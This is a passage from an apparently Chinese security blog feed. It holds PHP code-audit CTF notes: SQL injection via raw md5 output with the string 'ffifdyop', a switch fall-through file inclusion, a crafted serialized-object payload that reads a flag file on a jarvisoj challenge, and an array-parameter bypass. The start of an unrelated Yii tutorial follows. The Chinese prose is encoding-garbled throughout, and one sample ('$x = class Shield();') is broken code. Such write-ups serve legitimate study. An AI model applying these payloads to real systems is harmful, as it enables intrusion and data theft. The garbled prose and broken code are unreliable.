class="string">"SELECT * FROM users WHERE password = '"</span>.md5(<span class="variable">$password</span>,true).<span class="string">"'"</span>;</span><br><span class="line">var_dump(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>) or die(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"><span class="variable">$row1</span> = mysql_fetch_row(<span class="variable">$result</span>);</span><br><span class="line">var_dump(<span class="variable">$row1</span>);</span><br><span class="line">mysql_close(<span class="variable">$link</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å½“md5åçš„hexè½¬æ¢æˆå­—ç¬¦ä¸²åï¼Œå¦‚æœåŒ…å« â€˜orâ€™<trash> è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œé‚£æ•´ä¸ªsqlå˜æˆ<br>SELECT * FROM admin WHERE pass = â€˜â€™orâ€™6<trash>â€˜<br>æä¾›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼šffifdyop</trash></trash></p><p>md5åï¼Œ276f722736c95d99e921722cf9ed621c</p><p>å†è½¬æˆå­—ç¬¦ä¸²ï¼š â€˜orâ€™6<trash></trash></p><h2 id="switchæ²¡æœ‰break-å­—ç¬¦ä¸0æ¯”è¾ƒç»•è¿‡"><a href="#switchæ²¡æœ‰break-å­—ç¬¦ä¸0æ¯”è¾ƒç»•è¿‡" class="headerlink" title="switchæ²¡æœ‰break å­—ç¬¦ä¸0æ¯”è¾ƒç»•è¿‡"></a>switchæ²¡æœ‰break å­—ç¬¦ä¸0æ¯”è¾ƒç»•è¿‡</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'which'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $which = $_GET[<span class="string">'which'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">switch</span> ($which)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="number">0</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="number">1</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="number">2</span>:</span></span><br><span class="line"><span class="php">        <span class="keyword">require_once</span> $which.<span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php">         <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">default</span>:</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> GWF_HTML::error(<span class="string">'PHP-0817'</span>, <span class="string">'Hacker NoNoNo!'</span>, <span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>è®©æˆ‘ä»¬åŒ…å«å½“å‰ç›®å½•ä¸­çš„flag.phpï¼Œç»™whichä¸ºflagï¼Œè¿™é‡Œä¼šå‘ç°åœ¨case 0å’Œcase 1çš„æ—¶å€™ï¼Œæ²¡æœ‰breakï¼ŒæŒ‰ç…§å¸¸è§„æ€ç»´ï¼Œåº”è¯¥æ˜¯0æ¯”è¾ƒä¸æˆåŠŸï¼Œè¿›å…¥æ¯”è¾ƒ1ï¼Œç„¶åæ¯”è¾ƒ2ï¼Œå†ç„¶åè¿›å…¥defaultï¼Œä½†æ˜¯äº‹å®å´ä¸æ˜¯è¿™æ ·ï¼Œäº‹å®ä¸Šï¼Œåœ¨ case 0çš„æ—¶å€™ï¼Œå­—ç¬¦ä¸²å’Œ0æ¯”è¾ƒæ˜¯ç›¸ç­‰çš„ï¼Œè¿›å…¥äº†case 0çš„æ–¹æ³•ä½“ï¼Œä½†æ˜¯å´æ²¡æœ‰breakï¼Œè¿™ä¸ªæ—¶å€™ï¼Œé»˜è®¤åˆ¤æ–­å·²ç»æ¯”è¾ƒæˆåŠŸäº†ï¼Œè€Œå¦‚æœåŒ¹é…æˆåŠŸä¹‹åï¼Œä¼šç»§ç»­æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæ˜¯ä¸ä¼šå†ç»§ç»­è¿›è¡Œä»»ä½•åˆ¤æ–­çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬whichä¼ å…¥flagçš„æ—¶å€™ï¼Œcase 0æ¯”è¾ƒè¿›å…¥äº†æ–¹æ³•ä½“ï¼Œä½†æ˜¯æ²¡æœ‰breakï¼Œé»˜è®¤å·²ç»åŒ¹é…æˆåŠŸï¼Œå¾€ä¸‹æ‰§è¡Œä¸å†åˆ¤æ–­ï¼Œè¿›å…¥2çš„æ—¶å€™ï¼Œæ‰§è¡Œäº†require_once flag.php</p><p>PHPä¸­éæ•°å­—å¼€å¤´å­—ç¬¦ä¸²å’Œæ•°å­— 0æ¯”è¾ƒ==éƒ½è¿”å›True</p><p>å› ä¸ºé€šè¿‡é€»è¾‘è¿ç®—ç¬¦è®©å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œä¼šè‡ªåŠ¨å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—.è€Œå½“å­—ç¬¦ä¸²æ— æ³•è½¬æ¢ä¸ºæ•°å­—æ—¶ï¼Œå…¶ç»“æœå°±ä¸º0äº†ï¼Œç„¶åå†å’Œå¦ä¸€ä¸ª0æ¯”å¤§å°ï¼Œç»“æœè‡ªç„¶ä¸ºtureã€‚æ³¨æ„ï¼šå¦‚æœé‚£ä¸ªå­—ç¬¦ä¸²æ˜¯ä»¥æ•°å­—å¼€å¤´çš„ï¼Œå¦‚6ldbï¼Œå®ƒè¿˜æ˜¯å¯ä»¥è½¬ä¸ºæ•°å­—6çš„ï¼Œç„¶åå’Œ0æ¯”è¾ƒå°±ä¸ç­‰äº†ï¼ˆä½†æ˜¯å’Œ6æ¯”è¾ƒå°±ç›¸ç­‰ï¼‰ if($str==0) åˆ¤æ–­ å’Œ if( intval($str) == 0 ) æ˜¯ç­‰ä»·çš„<br>å¯ä»¥éªŒè¯ï¼š<br>&lt;?php<br>$str=â€s6sâ€;<br>if($str==0){ echo â€œè¿”å›äº†true.â€;}<br>?&gt;<br>è¦å­—ç¬¦ä¸²ä¸æ•°å­—åˆ¤æ–­ä¸è½¬ç±»å‹æ–¹æ³•æœ‰ï¼š</p><p>æ–¹æ³•ä¸€ï¼š $str=â€å­—ç¬¦ä¸²â€;if($str===0){ echo â€œè¿”å›äº†true.â€;}</p><p>æ–¹æ³•äºŒï¼š $str=â€å­—ç¬¦ä¸²â€;if($str==â€0â€){ echo â€œè¿”å›äº†true.â€;} ,</p><p>æ­¤é¢˜æ„é€ ï¼š<a href="http://127.0.0.1/php_bug/25.php?which=aa" target="_blank" rel="noopener">http://127.0.0.1/php_bug/25.php?which=aa</a></p><p>èµ„æ–™ï¼š</p><h2 id="unserialize-åºåˆ—åŒ–"><a href="#unserialize-åºåˆ—åŒ–" class="headerlink" title="unserialize()åºåˆ—åŒ–"></a>unserialize()åºåˆ—åŒ–</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- é¢˜ç›®ï¼šhttp://web.jarvisoj.com:32768 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- index.php --&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span></span><br><span class="line"><span class="php">$x = <span class="keyword">new</span> Shield();</span></span><br><span class="line"><span class="php"><span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span></span><br><span class="line"><span class="php">$x = unserialize($g);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $x-&gt;readfile();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> <span class="attr">width</span>=<span class="string">"100%"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- shield.php --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//flag is in pctf.php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">$this</span> -&gt; file = $filename;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span></span><br><span class="line"><span class="php">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- showimg.php --&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$f = $_GET[<span class="string">'img'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span></span><br><span class="line"><span class="php">$f = base64_decode($f);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span></span><br><span class="line"><span class="php"><span class="comment">//stripos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</span></span></span><br><span class="line"><span class="php">&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php">readfile($f);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯´æ˜flagåœ¨pctf.phpï¼Œä½†showimg.phpä¸­ä¸å…è®¸ç›´æ¥è¯»å–pctf.phpï¼Œåªæœ‰åœ¨index.phpä¸­å¯ä»¥ä¼ å…¥å˜é‡<span class="keyword">class</span> ï¼Œindex.phpä¸­Shieldç±»çš„å®ä¾‹<span class="variable">$X</span> = unserialize(<span class="variable">$g</span>)ï¼Œ<span class="variable">$g</span> = <span class="variable">$_GET</span>['<span class="keyword">class</span>'];ï¼Œ<span class="variable">$X</span>ä¸­ä¸çŸ¥<span class="variable">$filename</span>å˜é‡ï¼Œä½†éœ€è¦æ‰¾çš„æ˜¯ï¼š<span class="variable">$filename</span> = <span class="string">"pctf.php"</span>ï¼Œç°<span class="variable">$X</span>å·²çŸ¥ï¼Œæ±‚ä¼ å…¥çš„<span class="keyword">class</span>å˜é‡å€¼ã€‚ å¯ä»¥è¿›è¡Œåºåˆ—åŒ–æ“ä½œï¼š</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- answer.php --&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span></span><br><span class="line"><span class="php">$x = <span class="class"><span class="keyword">class</span> <span class="title">Shield</span>();</span></span></span><br><span class="line"><span class="php">$g = serialize($x);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $g;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- shield.php --&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="comment">//flag is in pctf.php</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">'pctf.php'</span>)</span> </span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span> -&gt; file = $filename;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span></span><br><span class="line"><span class="php">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š O:6:â€Shieldâ€:1:{s:4:â€fileâ€;s:8:â€pctf.phpâ€;} æ„é€ ï¼š <a href="http://web.jarvisoj.com:32768/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</a></p><h2 id="åˆ©ç”¨æäº¤æ•°ç»„ç»•è¿‡é€»è¾‘"><a href="#åˆ©ç”¨æäº¤æ•°ç»„ç»•è¿‡é€»è¾‘" class="headerlink" title="åˆ©ç”¨æäº¤æ•°ç»„ç»•è¿‡é€»è¾‘"></a>åˆ©ç”¨æäº¤æ•°ç»„ç»•è¿‡é€»è¾‘</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$role = <span class="string">"guest"</span>;</span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag&#123;test_flag&#125;"</span>;</span></span><br><span class="line"><span class="php">$auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>]))&#123;</span></span><br><span class="line"><span class="php">    $role = unserialize(base64_decode($_COOKIE[<span class="string">"role"</span>]));</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($role === <span class="string">"admin"</span>)&#123;</span></span><br><span class="line"><span class="php">        $auth = <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    $role = base64_encode(serialize($role));</span></span><br><span class="line"><span class="php">    setcookie(<span class="string">'role'</span>,$role);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($auth)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>]))&#123;</span></span><br><span class="line"><span class="php">        $filename = $_POST[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php">        $data = $_POST[<span class="string">'data'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(preg_match(<span class="string">'[&lt;&gt;?]'</span>, $data)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'No No No!'</span>.$data);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            $s = implode($data);</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(!preg_match(<span class="string">'[&lt;&gt;?]'</span>, $s))&#123;</span></span><br><span class="line"><span class="php">                $flag=<span class="string">'None.'</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            $rand = rand(<span class="number">1</span>,<span class="number">10000000</span>);</span></span><br><span class="line"><span class="php">            $tmp=<span class="string">"./uploads/"</span>.md5(time() + $rand).$filename;</span></span><br><span class="line"><span class="php">            file_put_contents($tmp, $flag);</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"your file is in "</span> . $tmp;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Hello admin, now you can upload something you are easy to forget."</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;there are the source.&lt;br /&gt;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;textarea rows="10" cols="100"&gt;'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> htmlspecialchars(str_replace($flag,<span class="string">'flag&#123;???&#125;'</span>,file_get_contents(<span class="keyword">__FILE__</span>)));</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;/textarea&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Sorry. You have no permissions."</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç é¦–å…ˆä¼šæŸ¥çœ‹æäº¤çš„è¯·æ±‚ä¸­æ˜¯å¦å­˜åœ¨ &lt;&gt; å¦‚æœæ²¡æœ‰åˆ™å°†ä¼ å…¥çš„æ•°æ®(å¦‚æœæ˜¯æ•°ç»„)è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ã€‚å¦‚æœå…¶ä¸­å­˜åœ¨ &lt;&gt; åˆ™å°†flagç”Ÿæˆåœ¨ä¸€ä¸ªéšæœºå‘½åçš„æ–‡ä»¶ä¸­ã€‚ implode() è¿™ä¸ªå‡½æ•°éœ€è¦ä¼ å…¥æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„æ˜¯å­—ç¬¦ä¸²å°†æŠ¥é”™ï¼Œå˜é‡ $s è‡ªç„¶ä¹Ÿå°±æ²¡æœ‰å€¼ã€‚<br>æƒ³è¦é€šè¿‡Postè¯·æ±‚çš„å½¢å¼ä¼ å…¥æ•°ç»„å¯ä»¥ä½¿ç”¨ data[0]=123&amp;data[1]=&lt;&gt; çš„å½¢å¼ä¼ å…¥æ•°ç»„ï¼Œè¿™æ ·çš„è¯åœ¨æ‰§è¡Œ implode() å‡½æ•°çš„æ—¶å€™å°±ä¸ä¼šä½¿ &amp;s ä¸ºç©ºï¼ŒæˆåŠŸç»•è¿‡è¿™æ®µé€»è¾‘æ‹¿åˆ°flagã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>YIIåŸºç¡€å­¦ä¹ ç¬”è®°</title>
      <link href="/2019/03/01/YII%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/03/01/YII%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h2><p>å®ç°åœ¨HelloController.phpä¸­ç¼–å†™</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'hello word'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1/basic/web/index.php?r=hello/index" target="_blank" rel="noopener">http://127.0.0.1/basic/web/index.php?r=hello/index</a> è®¿é—®æˆåŠŸ</p><p>è·å–getå’Œpost è¯·æ±‚å†…å®¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $request = \YII::$app-&gt;request;<span class="comment">//å…¨å±€ç±»</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $request-&gt;get(<span class="string">'id'</span>,<span class="number">20</span>); <span class="comment">//å½“æ²¡æœ‰è¿›è¡Œgetæ—¶ é»˜è®¤ä¸º20</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k7c6dvkcj30ey063aa5.jpg" alt=""></p><p>åŒæ ·ä¹Ÿå¯ä»¥ $request-&gt;post(â€˜idâ€™,20);è¿›è¡Œpost</p><h3 id="YIIæ“ä½œHTTP"><a href="#YIIæ“ä½œHTTP" class="headerlink" title="YIIæ“ä½œHTTP"></a>YIIæ“ä½œHTTP</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 